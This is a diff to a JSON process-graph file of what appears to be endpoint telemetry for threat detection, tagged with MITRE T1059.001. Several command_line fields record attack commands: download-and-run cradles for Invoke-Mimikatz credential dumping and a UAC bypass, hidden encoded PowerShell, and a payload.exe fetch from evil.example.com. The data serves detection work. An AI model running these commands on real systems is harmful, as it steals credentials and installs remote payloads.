-        "image_hash": "MD5=F40EC96CA18D88CB1F26FA2070010714,SHA256=607C014A3CA531FFAD50BCD90095C01E4E6B691D9E18473C70E4699CF1E31453,IMPHASH=4216D8E7F36901B61DFD6309B49BCF96",
-        "command_hash": "b16d29df420c9110b5a2ed97ef661332ad7e2c63f73bc72fc04213edd5d071aa",
-        "event_id": "1",
-        "id": "Process:{EF7148D2-9B8D-5FB7-8900-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "winrshost.exe",
-        "name": "winrshost.exe",
-        "parent_process_id": "Process:{EF7148D2-9B58-5FB7-0C00-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{5ABCFE62-E9B3-6040-434E-00000000AD01}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{5ABCFE62-E9B3-6040-434E-00000000AD01}",
-        "pid": "2200",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c \"powershell.exe \"invoke-expression (new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\\powershellmafia\\powersploit\\f650520c4b1004daf8b3ec08007a0b945b91253a\\exfiltration\\invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds\"",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "19ceff38a6104315e0faef3e3e3dcdb9a3f57ee7aacf34edf642f7f50d4bd7e8",
-        "event_id": "1",
-        "id": "Process:{5ABCFE62-E9B3-6040-434E-00000000AD01}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{5ABCFE62-D502-6040-CD4B-00000000AD01}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{E983936C-B3C5-6006-8700-00000000A301}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{E983936C-B3C5-6006-8700-00000000A301}",
-        "pid": "4076",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe \\c powershell -noprofile -noninteractive -executionpolicy unrestricted -encodedcommand dwboag8ayqbtagka <ps_bypass_flag>",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "28cf8323ec21d81bae56f246181b6e06edc7a6d1edf0945a0e3add1755b46600",
-        "event_id": "1",
-        "id": "Process:{E983936C-B3C5-6006-8700-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{E983936C-B3C5-6006-8500-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{2935EF20-8EF8-5FD0-0000-001035530000}:1",
-      "label": "services.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "services and controller app",
-        "guid": "{2935EF20-8EF8-5FD0-0000-001035530000}",
-        "pid": "844",
-        "image_path": "%system32%\\services.exe",
-        "command_line": "%system32%\\services.exe",
-        "original_file_name": "services.exe",
-        "image_hash": "MD5=457FD1B4ED8D29816560345AE5BA9B73,SHA256=D99AA02447946EFB935B11D21DF99AFDDA0955A588D6AAC42746DE73E1253956,IMPHASH=264C7CFAFE91682E421A605C58E86E40",
-        "command_hash": "d0fc7895a39c81befb2b95c24c6c8a5005d9dc3d81f8b2058c3eae1b79929f4e",
-        "event_id": "1",
-        "id": "Process:{2935EF20-8EF8-5FD0-0000-001035530000}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "services.exe",
-        "name": "services.exe",
-        "parent_process_id": "Process:{2935EF20-8EF8-5FD0-0000-0010F6460000}:1",
-        "user_id": "User:S-1-5-18"
+        "id": "Technique:T1059_001",
+        "name": "T1059.001",
+        "display_name": "T1059.001",
+        "type": "Technique",
+        "entity_class": "Technique"
       }
     },
     {
@@ -1832,129 +1727,6 @@
         "entity_class": "NetworkEntity",
         "display_name": "67.199.248.11",
         "name": "67.199.248.11"
-      }
-    },
-    {
-      "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef1}:1",
-      "label": "windows powershell",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{b2c3d4e5-f6a7-8901-2345-67890abcdef1}",
-        "pid": "4568",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "powershell.exe -windowstyle hidden -noninteractive -executionpolicy bypass -file \"%programfiles%\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon\\scripts\\payload.ps1 <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "SHA1=2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B,MD5=2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D,SHA256=2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B",
-        "command_hash": "7a72b0f662225a094bb1c4dc30d2c7d7b0e0e484713d2943e39fd4718bb85db6",
-        "parent_process_id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef0}:1",
-        "user_id": "User:S-1-5-21-3623811015-3361044348-30300820-1001",
-        "event_id": "1",
-        "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef1}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows powershell",
-        "name": "windows powershell"
-      }
-    },
-    {
-      "id": "File:ec9b2559aee20768b7266f02b55cf40d07b7b9395d00f095b8f6c620a1a1e4cb:11",
-      "label": "hd5fm2ld.cmdline",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%temp%\\hd5fm2ld\\hd5fm2ld.cmdline",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
-        "event_id": "11",
-        "id": "File:ec9b2559aee20768b7266f02b55cf40d07b7b9395d00f095b8f6c620a1a1e4cb:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "hd5fm2ld.cmdline",
-        "name": "hd5fm2ld.cmdline"
-      }
-    },
-    {
-      "id": "network:::ffff:67.199.248.10;::ffff:67.199.248.11;::tcp",
-      "label": "::ffff:67.199.248.10;::ffff:67.199.248.11;",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "::ffff:67.199.248.10;::ffff:67.199.248.11;",
-        "destination_port": "",
-        "protocol": "tcp",
-        "domain_name": "bit.ly",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "parent_process_id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
-        "event_id": "22",
-        "id": "network:::ffff:67.199.248.10;::ffff:67.199.248.11;::tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "::ffff:67.199.248.10;::ffff:67.199.248.11;",
-        "name": "::ffff:67.199.248.10;::ffff:67.199.248.11;"
-      }
-    },
-    {
-      "id": "Process:{c3d4e5f6-a7b8-9012-3456-7890abcdef12}:1",
-      "label": "windows powershell",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{c3d4e5f6-a7b8-9012-3456-7890abcdef12}",
-        "pid": "5678",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe -windowstyle hidden %programfiles%\\windowsapps\\malicioustoolkit_3.0.0.0_x64__nopqrstuvwxyz\\scripts\\config.ps1 -action download -file http:\\evil.example.com\\payload.exe <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "SHA1=3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C,MD5=3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E,SHA256=3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C",
-        "command_hash": "3e2d6b0e18e9d646919a7345b809c4d1f3367ce899c3d428d0c64e9854a7f75a",
-        "parent_process_id": "Process:{c3d4e5f6-a7b8-9012-3456-7890abcdef11}:1",
-        "user_id": "User:S-1-5-21-3623811015-3361044348-30300820-1001",
-        "event_id": "1",
-        "id": "Process:{c3d4e5f6-a7b8-9012-3456-7890abcdef12}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows powershell",
-        "name": "windows powershell"
-      }
-    },
-    {
-      "id": "Technique:T1059_001",
-      "label": "T1059.001",
-      "type": "technique",
-      "group": "Technique",
-      "properties": {
-        "id": "Technique:T1059_001",
-        "name": "T1059.001",
-        "display_name": "T1059.001",
-        "type": "Technique",
-        "entity_class": "Technique"
-      }
-    },
-    {
-      "id": "Process:{2935EF20-8F24-5FD0-0000-00104DAC0500}:1",
-      "label": "winrshost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "host process for winrm's remote shell plugin",
-        "guid": "{2935EF20-8F24-5FD0-0000-00104DAC0500}",
-        "pid": "4588",
-        "image_path": "%system32%\\winrshost.exe",
-        "command_line": "%system32%\\winrshost.exe -embedding",
-        "original_file_name": "winrshost.exe",
-        "image_hash": "MD5=F40EC96CA18D88CB1F26FA2070010714,SHA256=607C014A3CA531FFAD50BCD90095C01E4E6B691D9E18473C70E4699CF1E31453,IMPHASH=4216D8E7F36901B61DFD6309B49BCF96",
-        "command_hash": "b16d29df420c9110b5a2ed97ef661332ad7e2c63f73bc72fc04213edd5d071aa",
-        "event_id": "1",
-        "id": "Process:{2935EF20-8F24-5FD0-0000-00104DAC0500}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "winrshost.exe",
-        "name": "winrshost.exe",
-        "parent_process_id": "Process:{2935EF20-8EFA-5FD0-0000-0010DF650000}:1",
-        "user_id": "User:S-1-5-18"
       }
     },
     {
@@ -1982,27 +1754,99 @@
       }
     },
     {
-      "id": "Process:{E983936C-CCF9-6006-5E07-00000000A301}:1",
+      "id": "Process:{5ABCFE62-E9C2-6040-4A4E-00000000AD01}:1",
       "label": "cmd.exe",
       "type": "process",
       "group": "Process",
       "properties": {
         "process_name": "windows command processor",
-        "guid": "{E983936C-CCF9-6006-5E07-00000000A301}",
-        "pid": "6580",
+        "guid": "{5ABCFE62-E9C2-6040-4A4E-00000000AD01}",
+        "pid": "5808",
         "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe \\c %appdata%\\microsoft\\windows\\start menu\\programs\\startup\\runwallpapersetupinit.cmd\"",
+        "command_line": "%system32%\\cmd.exe\" \\c \"powershell.exe \"invoke-expression (new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\\enigma0x3\\misc-powershell-stuff\\a0dfca7056ef20295b156b8207480dc2465f94c3\\invoke-apppathbypass.ps1'); invoke-apppathbypass -payload '%windir%\\system32\\cmd.exe'\"",
         "original_file_name": "cmd.exe",
         "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A",
-        "command_hash": "1d2dadac80afe60f7ba2e764185d90b9656dc94f33f543908b2266d8f6ab9875",
+        "command_hash": "2c5b0345007f3b0ff1974ed98b96760e3216d974c63c35337ad990b86e80ad3d",
         "event_id": "1",
-        "id": "Process:{E983936C-CCF9-6006-5E07-00000000A301}:1",
+        "id": "Process:{5ABCFE62-E9C2-6040-4A4E-00000000AD01}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
         "display_name": "cmd.exe",
         "name": "cmd.exe",
-        "parent_process_id": "Process:{E983936C-CCDD-6006-4607-00000000A301}:1",
+        "parent_process_id": "Process:{5ABCFE62-D502-6040-CD4B-00000000AD01}:1",
         "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{E983936C-B38F-6006-0C00-00000000A301}:1",
+      "label": "svchost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "host process for windows services",
+        "guid": "{E983936C-B38F-6006-0C00-00000000A301}",
+        "pid": "592",
+        "image_path": "%system32%\\svchost.exe",
+        "command_line": "%system32%\\svchost.exe -k dcomlaunch",
+        "original_file_name": "svchost.exe",
+        "image_hash": "MD5=36F670D89040709013F6A460176767EC,SHA256=438B6CCD84F4DD32D9684ED7D58FD7D1E5A75FE3F3D12AB6C788E6BB0FFAD5E7,IMPHASH=2CED93915677390B76EE1916B92F3EF6",
+        "command_hash": "28b32bc560e36b3ba60e30317203363f92776e1d46a79bcc4970554f0ad5dd19",
+        "event_id": "1",
+        "id": "Process:{E983936C-B38F-6006-0C00-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "svchost.exe",
+        "name": "svchost.exe",
+        "parent_process_id": "Process:{E983936C-B38D-6006-0A00-00000000A301}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef0}:1",
+      "label": "aistubx86.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{b2c3d4e5-f6a7-8901-2345-67890abcdef0}",
+        "pid": "1235",
+        "image_path": "%programfiles%\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon\\ai_stubs\\aistubx86.exe",
+        "command_line": "%programfiles%\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon\\ai_stubs\\aistubx86.exe\" -appid fakeinstaller -appdir \"c:\\program files\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef0}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "aistubx86.exe",
+        "name": "aistubx86.exe"
+      }
+    },
+    {
+      "id": "Process:{e8747bb8-6cb9-67e1-2463-000000004103}:1",
+      "label": "explorer.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "",
+        "guid": "{e8747bb8-6cb9-67e1-2463-000000004103}",
+        "pid": "5368",
+        "image_path": "%windir%\\explorer.exe",
+        "command_line": "%windir%\\explorer.exe",
+        "original_file_name": "",
+        "image_hash": "",
+        "command_hash": "",
+        "parent_process": null,
+        "user": null,
+        "event_id": "1",
+        "id": "Process:{e8747bb8-6cb9-67e1-2463-000000004103}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "explorer.exe",
+        "name": "explorer.exe"
       }
     },
     {
@@ -2030,26 +1874,178 @@
       }
     },
     {
-      "id": "Process:{EF7148D2-9B56-5FB7-0400-000000009101}:1",
-      "label": "smss.exe",
+      "id": "Process:{5ABCFE62-E9B3-6040-444E-00000000AD01}:1",
+      "label": "powershell.exe",
       "type": "process",
       "group": "Process",
       "properties": {
-        "process_name": "windows session manager",
-        "guid": "{EF7148D2-9B56-5FB7-0400-000000009101}",
-        "pid": "640",
-        "image_path": "%system32%\\smss.exe",
-        "command_line": "systemroot\\system32\\smss.exe 000000d4 0000007c",
-        "original_file_name": "smss.exe",
-        "image_hash": "MD5=725EC50D4B0F607BF5B45B5E0115770B,SHA256=56881BCAEAC350107A6453F38F020FE0E284DBE2E8A6F37ED482985E0DD98EA7,IMPHASH=09DDECA5943933973FE7DDDD24ED724A",
-        "command_hash": "31ed9534097a6f9e647abd4f08bd582aee31268f86e45490f32bfa81c15b9de4",
+        "process_name": "windows powershell",
+        "guid": "{5ABCFE62-E9B3-6040-444E-00000000AD01}",
+        "pid": "6232",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe  \"invoke-expression (new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\\powershellmafia\\powersploit\\f650520c4b1004daf8b3ec08007a0b945b91253a\\exfiltration\\invoke-mimikatz.ps1'); invoke-mimikatz -dumpcreds",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "96137a963dee69d8b22d3ead25501fbc710d1600cca15fe7c336b2d326c0379a",
         "event_id": "1",
-        "id": "Process:{EF7148D2-9B56-5FB7-0400-000000009101}:1",
+        "id": "Process:{5ABCFE62-E9B3-6040-444E-00000000AD01}:1",
         "type": "Process",
         "entity_class": "ProcessEntity",
-        "display_name": "smss.exe",
-        "name": "smss.exe",
-        "parent_process_id": "Process:{EF7148D2-9B55-5FB7-0200-000000009101}:1",
+        "display_name": "powershell.exe",
+        "name": "powershell.exe",
+        "parent_process_id": "Process:{5ABCFE62-E9B3-6040-434E-00000000AD01}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:ec9b2559aee20768b7266f02b55cf40d07b7b9395d00f095b8f6c620a1a1e4cb:11",
+      "label": "hd5fm2ld.cmdline",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "%temp%\\hd5fm2ld\\hd5fm2ld.cmdline",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
+        "event_id": "11",
+        "id": "File:ec9b2559aee20768b7266f02b55cf40d07b7b9395d00f095b8f6c620a1a1e4cb:11",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "hd5fm2ld.cmdline",
+        "name": "hd5fm2ld.cmdline"
+      }
+    },
+    {
+      "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef1}:1",
+      "label": "windows powershell",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{b2c3d4e5-f6a7-8901-2345-67890abcdef1}",
+        "pid": "4568",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "powershell.exe -windowstyle hidden -noninteractive -executionpolicy bypass -file \"%programfiles%\\windowsapps\\fakeinstaller_2.0.0.0_x86__zyxwvutsrqpon\\scripts\\payload.ps1 <ps_bypass_flag>",
+        "original_file_name": "powershell.exe",
+        "image_hash": "SHA1=2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B,MD5=2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D,SHA256=2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B",
+        "command_hash": "7a72b0f662225a094bb1c4dc30d2c7d7b0e0e484713d2943e39fd4718bb85db6",
+        "parent_process_id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef0}:1",
+        "user_id": "User:S-1-5-21-3623811015-3361044348-30300820-1001",
+        "event_id": "1",
+        "id": "Process:{b2c3d4e5-f6a7-8901-2345-67890abcdef1}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows powershell",
+        "name": "windows powershell"
+      }
+    },
+    {
+      "id": "Process:{EF7148D2-9B56-5FB7-0A00-000000009101}:1",
+      "label": "services.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "services and controller app",
+        "guid": "{EF7148D2-9B56-5FB7-0A00-000000009101}",
+        "pid": "856",
+        "image_path": "%system32%\\services.exe",
+        "command_line": "%system32%\\services.exe",
+        "original_file_name": "services.exe",
+        "image_hash": "MD5=457FD1B4ED8D29816560345AE5BA9B73,SHA256=D99AA02447946EFB935B11D21DF99AFDDA0955A588D6AAC42746DE73E1253956,IMPHASH=264C7CFAFE91682E421A605C58E86E40",
+        "command_hash": "d0fc7895a39c81befb2b95c24c6c8a5005d9dc3d81f8b2058c3eae1b79929f4e",
+        "event_id": "1",
+        "id": "Process:{EF7148D2-9B56-5FB7-0A00-000000009101}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "services.exe",
+        "name": "services.exe",
+        "parent_process_id": "Process:{EF7148D2-9B56-5FB7-0700-000000009101}:1",
+        "user_id": "User:S-1-5-18"
+      }
+    },
+    {
+      "id": "File:970749539f7cef8cce617d1ed61bb84594ae3c7eca49cf88514d930366ddc147:17",
+      "label": "pshost.132593404674047142.6232.defaultappdomain.powershell",
+      "type": "file",
+      "group": "File",
+      "properties": {
+        "file_path": "pshost.132593404674047142.6232.defaultappdomain.powershell",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "content_hash": "",
+        "parent_process_id": "Process:{5ABCFE62-E9B3-6040-444E-00000000AD01}:1",
+        "event_id": "17",
+        "id": "File:970749539f7cef8cce617d1ed61bb84594ae3c7eca49cf88514d930366ddc147:17",
+        "type": "File",
+        "entity_class": "FileEntity",
+        "display_name": "pshost.132593404674047142.6232.defaultappdomain.powershell",
+        "name": "pshost.132593404674047142.6232.defaultappdomain.powershell"
+      }
+    },
+    {
+      "id": "network:::ffff:67.199.248.10;::ffff:67.199.248.11;::tcp",
+      "label": "::ffff:67.199.248.10;::ffff:67.199.248.11;",
+      "type": "network",
+      "group": "Network",
+      "properties": {
+        "destination_ip": "::ffff:67.199.248.10;::ffff:67.199.248.11;",
+        "destination_port": "",
+        "protocol": "tcp",
+        "domain_name": "bit.ly",
+        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "parent_process_id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
+        "event_id": "22",
+        "id": "network:::ffff:67.199.248.10;::ffff:67.199.248.11;::tcp",
+        "type": "Network",
+        "entity_class": "NetworkEntity",
+        "display_name": "::ffff:67.199.248.10;::ffff:67.199.248.11;",
+        "name": "::ffff:67.199.248.10;::ffff:67.199.248.11;"
+      }
+    },
+    {
+      "id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
+      "label": "windows powershell",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "windows powershell",
+        "guid": "{E983936C-CD9F-6006-9907-00000000A301}",
+        "pid": "7244",
+        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "original_file_name": "powershell.exe",
+        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
+        "command_hash": "e56a219e08c86bcf852923b77fe748a7075f1c7baab9faf1d21e8fefbd64d05f",
+        "parent_process_id": "Process:{E983936C-CCDD-6006-4607-00000000A301}:1",
+        "user_id": "User:S-1-5-18",
+        "event_id": "1",
+        "id": "Process:{E983936C-CD9F-6006-9907-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "windows powershell",
+        "name": "windows powershell"
+      }
+    },
+    {
+      "id": "Process:{E983936C-B3C5-6006-8500-00000000A301}:1",
+      "label": "winrshost.exe",
+      "type": "process",
+      "group": "Process",
+      "properties": {
+        "process_name": "host process for winrm's remote shell plugin",
+        "guid": "{E983936C-B3C5-6006-8500-00000000A301}",
+        "pid": "5076",
+        "image_path": "%system32%\\winrshost.exe",
+        "command_line": "%system32%\\winrshost.exe -embedding",
+        "original_file_name": "winrshost.exe",
+        "image_hash": "MD5=F40EC96CA18D88CB1F26FA2070010714,SHA256=607C014A3CA531FFAD50BCD90095C01E4E6B691D9E18473C70E4699CF1E31453,IMPHASH=4216D8E7F36901B61DFD6309B49BCF96",
+        "command_hash": "b16d29df420c9110b5a2ed97ef661332ad7e2c63f73bc72fc04213edd5d071aa",
+        "event_id": "1",
+        "id": "Process:{E983936C-B3C5-6006-8500-00000000A301}:1",
+        "type": "Process",
+        "entity_class": "ProcessEntity",
+        "display_name": "winrshost.exe",
+        "name": "winrshost.exe",
+        "parent_process_id": "Process:{E983936C-B38F-6006-0C00-00000000A301}:1",
         "user_id": "User:S-1-5-18"
       }
     },
@@ -2078,30 +2074,6 @@
       }
     },
     {
-      "id": "Process:{EF7148D2-9B56-5FB7-0A00-000000009101}:1",
-      "label": "services.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "services and controller app",
-        "guid": "{EF7148D2-9B56-5FB7-0A00-000000009101}",
-        "pid": "856",
-        "image_path": "%system32%\\services.exe",
-        "command_line": "%system32%\\services.exe",
-        "original_file_name": "services.exe",
-        "image_hash": "MD5=457FD1B4ED8D29816560345AE5BA9B73,SHA256=D99AA02447946EFB935B11D21DF99AFDDA0955A588D6AAC42746DE73E1253956,IMPHASH=264C7CFAFE91682E421A605C58E86E40",
-        "command_hash": "d0fc7895a39c81befb2b95c24c6c8a5005d9dc3d81f8b2058c3eae1b79929f4e",
-        "event_id": "1",
-        "id": "Process:{EF7148D2-9B56-5FB7-0A00-000000009101}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "services.exe",
-        "name": "services.exe",
-        "parent_process_id": "Process:{EF7148D2-9B56-5FB7-0700-000000009101}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
       "id": "Process:{E983936C-CCDD-6006-4607-00000000A301}:1",
       "label": "explorer.exe",
       "type": "process",
@@ -2119,164 +2091,6 @@
         "user": null,
         "event_id": "1",
         "id": "Process:{E983936C-CCDD-6006-4607-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "explorer.exe",
-        "name": "explorer.exe"
-      }
-    },
-    {
-      "id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
-      "label": "windows powershell",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows powershell",
-        "guid": "{E983936C-CCF9-6006-6007-00000000A301}",
-        "pid": "6628",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe  -noprofile -noninteractive -nologo -windowstyle hidden -executionpolicy unrestricted \"import-module \"%programdata%\\amazon\\ec2-windows\\launch\\module\\ec2launch.psd1\"; set-wallpaper -initial <ps_bypass_flag>",
-        "original_file_name": "powershell.exe",
-        "image_hash": "MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453",
-        "command_hash": "ad881edde1594729d4cdbc33b092285b7cb9d63526ea843a079f2db6b83f12ce",
-        "parent_process_id": "Process:{E983936C-CCF9-6006-5E07-00000000A301}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "windows powershell",
-        "name": "windows powershell"
-      }
-    },
-    {
-      "id": "network:<private_ip>:80:tcp",
-      "label": "<PRIVATE_IP>",
-      "type": "network",
-      "group": "Network",
-      "properties": {
-        "destination_ip": "<PRIVATE_IP>",
-        "destination_port": "80",
-        "protocol": "tcp",
-        "domain_name": "-",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "parent_process_id": "Process:{E983936C-CCF9-6006-6007-00000000A301}:1",
-        "event_id": "3",
-        "id": "network:<private_ip>:80:tcp",
-        "type": "Network",
-        "entity_class": "NetworkEntity",
-        "display_name": "<PRIVATE_IP>",
-        "name": "<PRIVATE_IP>"
-      }
-    },
-    {
-      "id": "Process:{E983936C-B38F-6006-0C00-00000000A301}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "host process for windows services",
-        "guid": "{E983936C-B38F-6006-0C00-00000000A301}",
-        "pid": "592",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "%system32%\\svchost.exe -k dcomlaunch",
-        "original_file_name": "svchost.exe",
-        "image_hash": "MD5=36F670D89040709013F6A460176767EC,SHA256=438B6CCD84F4DD32D9684ED7D58FD7D1E5A75FE3F3D12AB6C788E6BB0FFAD5E7,IMPHASH=2CED93915677390B76EE1916B92F3EF6",
-        "command_hash": "28b32bc560e36b3ba60e30317203363f92776e1d46a79bcc4970554f0ad5dd19",
-        "event_id": "1",
-        "id": "Process:{E983936C-B38F-6006-0C00-00000000A301}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe",
-        "parent_process_id": "Process:{E983936C-B38D-6006-0A00-00000000A301}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{2935EF20-8EF8-5FD0-0000-0010F6460000}:1",
-      "label": "wininit.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows start-up application",
